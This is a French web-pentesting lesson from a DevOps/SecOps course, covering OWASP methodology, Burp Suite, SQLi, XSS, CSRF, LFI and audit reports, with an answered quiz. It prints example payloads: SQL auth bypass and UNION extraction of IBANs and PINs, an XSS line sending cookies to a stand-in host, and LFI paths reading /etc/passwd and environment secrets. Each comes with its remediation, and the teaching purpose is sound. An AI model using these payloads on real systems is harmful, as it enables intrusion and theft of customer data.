# TOME P4 — Cloud, DevOps & SecOps — Jour 181 (6h) : Sécurité Offensive — Pentest Web & OWASP (Burp Suite, SQLi, XSS, CSRF, LFI & Rapport d'Audit)

> [!NOTE]
> **Objectif du jour :** Acquérir les fondamentaux du **test d'intrusion (Pentest) Web** selon la méthodologie OWASP : utilisation de **Burp Suite** comme proxy d'interception, exploitation et prévention des vulnérabilités **SQLi (SQL Injection)**, **XSS (Cross-Site Scripting)**, **CSRF (Cross-Site Request Forgery)**, **LFI (Local File Inclusion)**, et rédaction d'un **rapport d'audit de sécurité** professionnel.
>
> **Compétences visées :** `SEC-06` (A) — Pentest Web & Red Team | `SEC-04` (A) — OWASP Top 10 & Remédiation

---

## 1) Module — Méthodologie Pentest & Burp Suite comme Proxy d'Interception (2h)

### 📖 Narration/Intuition

Un **test d'intrusion (Pentest)** est une attaque simulée et autorisée sur un système pour identifier ses vulnérabilités avant qu'un vrai attaquant ne le fasse. L'équipe Red Team de la BCC mandate régulièrement des pentesteurs pour tester la sécurité du portail bancaire en ligne.

**Burp Suite** est l'outil standard des pentesteurs web : il s'intercale entre le navigateur et le serveur web comme un **proxy MITM** (Man-In-The-Middle) pour intercepter, modifier et rejouer chaque requête HTTP/HTTPS.

### 🔍 Anatomie Technique

**Phases de la Méthodologie Pentest OWASP Testing Guide :**

```
PHASE 1 — RECONNAISSANCE (Passive)
  ├── OSINT (Google Dorks, Shodan, Censys)
  ├── Enumération DNS & Sous-domaines (amass, subfinder)
  ├── Analyse des en-têtes HTTP (Identification technologique)
  └── Analyse WHOIS & Certificats SSL

PHASE 2 — CARTOGRAPHIE (Mapping)
  ├── Crawling des URLs (Burp Suite Spider / ffuf)
  ├── Identification des endpoints API (Swagger/OpenAPI leak)
  └── Identification des paramètres d'entrée (GET/POST, Cookies, Headers)

PHASE 3 — EXPLOITATION (Exploitation)
  ├── Injection (SQLi, NoSQLi, Command Injection, SSTI)
  ├── Authentification & Session (Brute-Force, JWT Forgery)
  ├── Contrôle d'Accès (IDOR/BOLA, Privilege Escalation)
  ├── XSS (Reflected, Stored, DOM)
  └── CSRF, LFI/RFI, SSRF

PHASE 4 — POST-EXPLOITATION
  └── Rapport, PoC et Recommandations

PHASE 5 — RAPPORT
  └── Rapport détaillé avec criticité CVSS et remédiation
```

**Configuration de Burp Suite comme proxy :**
```bash
# 1. Lancer Burp Suite Community Edition
# 2. Configurer le proxy d'écoute : 127.0.0.1:8080
# 3. Configurer le navigateur Firefox :
#    Paramètres → Réseau → Proxy Manuel → HTTP: 127.0.0.1, Port: 8080
# 4. Installer le certificat CA de Burp (http://burpsuite → CA Certificate)
#    pour intercepter le trafic HTTPS sans avertissement TLS
```

---

## 2) Module — SQLi & XSS : Exploitation et Remédiation (2h)

### 📖 Narration/Intuition

Les deux vulnérabilités les plus répandues dans les applications web bancaires sont l'**Injection SQL** (manipulation de la base de données) et le **Cross-Site Scripting — XSS** (injection de code malveillant dans le navigateur des victimes).

### 🔍 Anatomie Technique

**1. Injection SQL (SQLi) — Exploitation & Remédiation :**

```sql
-- SCÉNARIO D'ATTAQUE : Formulaire de login du portail BCC
-- Code vulnérable (Concaténation de chaînes SQL) :
SELECT * FROM users WHERE email = '$email' AND password = '$password'

-- PAYLOAD SQLi Basique (Bypass d'authentification) :
-- Email saisi : admin@bcc.cd' OR '1'='1
-- Password saisi : n'importe quoi

-- Requête générée (DANGEREUSE) :
SELECT * FROM users WHERE email = 'admin@bcc.cd' OR '1'='1' AND password = 'x'
-- '1'='1' est toujours TRUE → L'attaquant est authentifié sans connaître le mot de passe !

-- PAYLOAD SQLi UNION-Based (Extraction des données de la table comptes) :
-- URL : /api/v1/accounts?id=1 UNION SELECT iban,solde,pin,NULL FROM comptes--
-- Cela peut retourner tous les comptes et PINs des clients BCC !

-- ════════════════════════════════════════
-- REMÉDIATION : Prepared Statements (PostgreSQL)
-- ════════════════════════════════════════
-- Jamais de concaténation de chaînes pour les requêtes SQL !
-- Toujours utiliser des paramètres liés (Bind Parameters) :

-- Node.js avec pg (PostgreSQL) :
const query = {
    text: 'SELECT * FROM users WHERE email = $1 AND password_hash = $2',
    values: [email, passwordHash]  // Les paramètres sont séparés de la requête SQL
};
const result = await pool.query(query);
-- Même si l'email contient "' OR '1'='1", il sera traité comme une chaîne littérale, jamais exécuté comme SQL.
```

**2. Cross-Site Scripting (XSS) — Types & Remédiation :**

```javascript
// TYPE 1 : XSS Reflected (Non-Persistant)
// URL malveillante envoyée à une victime BCC :
// https://portail.bcc.cd/search?q=<script>document.location='https://evil.cd/steal?c='+document.cookie</script>

// CODE VULNÉRABLE (Rendu direct de l'input utilisateur dans le HTML) :
// Node.js/Express sans échappement :
app.get('/search', (req, res) => {
    res.send(`<p>Résultats pour : ${req.query.q}</p>`); // INJECTION DIRECTE !
});

// TYPE 2 : XSS Stored (Persistant — Le plus dangereux)
// Scénario : L'attaquant enregistre un script XSS dans le champ "motif de virement"
// Tous les opérateurs BCC qui voient ce virement exécutent le script malveillant !

// ════════════════════════════════════════
// REMÉDIATION XSS
// ════════════════════════════════════════
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const purify = DOMPurify(window);

// 1. Sanitiser toutes les entrées utilisateur avant stockage
const motifNettoye = purify.sanitize(req.body.motif); // Supprime les tags script

// 2. Configurer le Content-Security-Policy (CSP) — Empêcher l'exécution de scripts externes
// Dans helmet (middleware Express) :
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],    // Interdire les scripts inline et les scripts externes
        styleSrc: ["'self'", "https://fonts.googleapis.com"],
        imgSrc: ["'self'", "data:"],
        connectSrc: ["'self'", "https://api.bcc.cd"]
    }
}));
```

---

## 3) Module — CSRF, LFI & Rédaction du Rapport d'Audit (2h)

### 📖 Narration/Intuition

**CSRF (Cross-Site Request Forgery)** : L'attaquant force le navigateur d'un utilisateur déjà authentifié sur le portail BCC à effectuer une action non désirée (ex: virement d'argent vers un compte de l'attaquant) depuis un site malveillant tiers.

**LFI (Local File Inclusion)** : L'attaquant manipule un paramètre de chemin de fichier pour lire des fichiers système sensibles du serveur (ex: `/etc/passwd`, clés privées SSH, variables d'environnement contenant des mots de passe).

### 🛠️ Atelier Pratique

**CSRF — Protection par Token Anti-CSRF (`csrf_protection.js`) :**

```javascript
const csurf = require('csurf');

// Générer un token CSRF unique par session
const csrfProtection = csurf({ cookie: true });
app.use(csrfProtection);

// Injecter le token dans chaque formulaire HTML (React)
app.get('/api/csrf-token', (req, res) => {
    res.json({ csrfToken: req.csrfToken() });
});

// Chaque requête POST doit inclure le token CSRF dans le header
// Le serveur valide que le token correspond à la session active
// Un site tiers malveillant ne peut pas connaître ce token secret
```

**LFI — Exemple d'Attaque et Remédiation :**

```
ATTAQUE LFI :
URL vulnérable : https://portail.bcc.cd/template?page=../../../etc/passwd
                 → Lit le fichier /etc/passwd du serveur !

URL LFI avancée : https://portail.bcc.cd/template?page=../../../proc/self/environ
                 → Lit les variables d'environnement (DB_PASSWORD, JWT_KEY !)

REMÉDIATION LFI :
1. Whitelist stricte des fichiers autorisés (jamais de chemins arbitraires)
2. Utiliser des identifiants (ex: page=accueil) → mapper vers des fichiers prédéfinis
3. Désactiver allow_url_include en PHP
4. Jail / Chroot l'application dans son répertoire
5. Valider avec realpath() que le chemin résolu reste dans le répertoire autorisé
```

**Structure Standard d'un Rapport d'Audit de Sécurité :**

```markdown
# RAPPORT D'AUDIT DE SÉCURITÉ — PORTAIL BCC
## Référence : BCC-AUDIT-2026-001 | Classificación : CONFIDENTIEL

### EXECUTIVE SUMMARY
- Période de test : Du 2026-06-01 au 2026-06-15
- Scope : portail.bcc.cd (Production) — Test boîte noire
- Criticité Max Trouvée : CRITIQUE (CVSS 9.8)

### FINDINGS (Classés par Criticité)

| ID | Titre | Criticité | CVSS | Endpoint Affecté |
|---|---|---|---|---|
| BCC-001 | SQL Injection Auth Bypass | CRITIQUE | 9.8 | /api/v1/login |
| BCC-002 | Stored XSS (Motif Virement) | ÉLEVÉE | 8.2 | /api/v1/virements |
| BCC-003 | CSRF sur Endpoint Virement | ÉLEVÉE | 7.5 | /api/v1/virements |
| BCC-004 | LFI via paramètre page | ÉLEVÉE | 7.3 | /template?page= |

### POUR CHAQUE FINDING :
- Description de la vulnérabilité
- Preuve d'exploitation (Screenshot Burp Suite, PoC)
- Impact Business (Fuite de données, Perte financière)
- Recommandation de Remédiation détaillée
- Référence CVE / CWE
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **SQLi** | SQL Injection — Attaque par injection de code SQL malveillant dans les requêtes |
| **XSS** | Cross-Site Scripting — Injection de scripts malveillants dans les pages web |
| **CSRF** | Cross-Site Request Forgery — Forger des requêtes authentifiées depuis un site malveillant tiers |
| **LFI** | Local File Inclusion — Lecture arbitraire de fichiers locaux du serveur via un paramètre |
| **RFI** | Remote File Inclusion — Inclusion d'un fichier distant malveillant sur le serveur |
| **SSRF** | Server-Side Request Forgery — Forcer le serveur à effectuer des requêtes vers des ressources internes |
| **CSP** | Content Security Policy — En-tête HTTP définissant les sources de contenu autorisées |
| **CVSS** | Common Vulnerability Scoring System — Système standardisé de notation de la criticité des vulnérabilités |
| **PoC** | Proof of Concept — Démonstration fonctionnelle d'une vulnérabilité |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Quelle est la différence entre un XSS **Reflected** et un XSS **Stored** ? Lequel est le plus dangereux et pourquoi ?

**Corrigé :** Le **XSS Reflected** (non-persistant) se produit quand le script malveillant est inclus dans l'URL et renvoyé immédiatement dans la réponse HTML sans être stocké. L'attaquant doit convaincre la victime de cliquer sur un lien piégé. Le **XSS Stored** (persistant) se produit quand le script malveillant est sauvegardé dans la base de données (ex: champ commentaire, motif de virement) et se réexécute dans le navigateur de **chaque utilisateur** qui consulte la page infectée, sans aucune interaction supplémentaire de l'attaquant. Le XSS Stored est **bien plus dangereux** car son impact est multiplié (toute l'équipe BCC qui consulte les virements est compromise), et il est beaucoup plus difficile à contenir une fois en place.

**Exercice 2 :** Expliquer pourquoi l'utilisation de **Prepared Statements** (requêtes paramétrées) élimine fondamentalement le risque d'injection SQL, contrairement à la simple validation ou à l'échappement des caractères spéciaux.

**Corrigé :** Un **Prepared Statement** sépare structurellement le **code SQL** des **données utilisateur** au niveau du protocole de communication avec la base de données. La requête SQL est d'abord compilée et planifiée par le moteur de BDD (`SELECT * FROM users WHERE email = $1`). Ensuite, les données utilisateur sont transmises séparément comme paramètres liés (`$1 = "admin' OR '1'='1"`). Le moteur de BDD traite ces données exclusivement comme des valeurs littérales de chaîne de caractères, jamais comme du code SQL exécutable. La validation ou l'échappement des caractères spéciaux (ex: remplacer `'` par `\'`) peut être contournée via des encodages avancés (Unicode, double-encoding), tandis que les Prepared Statements sont architecturalement invulnérables à l'injection SQL.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel outil est utilisé par les pentesteurs web comme proxy d'interception HTTP/HTTPS pour analyser, modifier et rejouer les requêtes vers une application web cible ?
- A) Burp Suite
- B) Nmap
- C) Wireshark
- D) Metasploit

**Réponse : A**

**Q2 :** Quelle technique de remédiation élimine définitivement le risque d'injection SQL en séparant le code SQL des données utilisateur au niveau protocolaire ?
- A) Les Prepared Statements (Requêtes Paramétrées)
- B) Le filtrage des caractères spéciaux uniquement
- C) L'utilisation de HTTPS
- D) Le Rate Limiting

**Réponse : A**

**Q3 :** Dans une attaque **CSRF (Cross-Site Request Forgery)**, quelle propriété du token Anti-CSRF empêche un site malveillant tiers de forger une requête valide ?
- A) Le token CSRF est unique par session, généré côté serveur, et inconnu du site malveillant tiers (Same-Origin Policy)
- B) Le token CSRF est stocké dans le localStorage
- C) Le token CSRF est envoyé dans l'URL
- D) Le token CSRF expire après 24h uniquement

**Réponse : A**

**Q4 :** Qu'est-ce qu'une vulnérabilité **LFI (Local File Inclusion)** et quel fichier Linux sensible est classiquement tenté par un attaquant pour valider son exploitation ?
- A) LFI permet de lire des fichiers arbitraires du serveur via un paramètre d'URL. Le fichier `/etc/passwd` est classiquement ciblé pour confirmer l'exploitation
- B) LFI permet de créer des fichiers sur le serveur
- C) LFI est une vulnérabilité de la base de données uniquement
- D) LFI est une abréviation de Load Firmware Injection

**Réponse : A**

**Q5 :** Quel en-tête HTTP de sécurité, configurable via le middleware `helmet`, bloque l'exécution de scripts JavaScript inline et provenant de domaines non autorisés, mitiguant ainsi les attaques XSS ?
- A) `Content-Security-Policy (CSP)`
- B) `X-Frame-Options`
- C) `X-Content-Type-Options`
- D) `Strict-Transport-Security`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
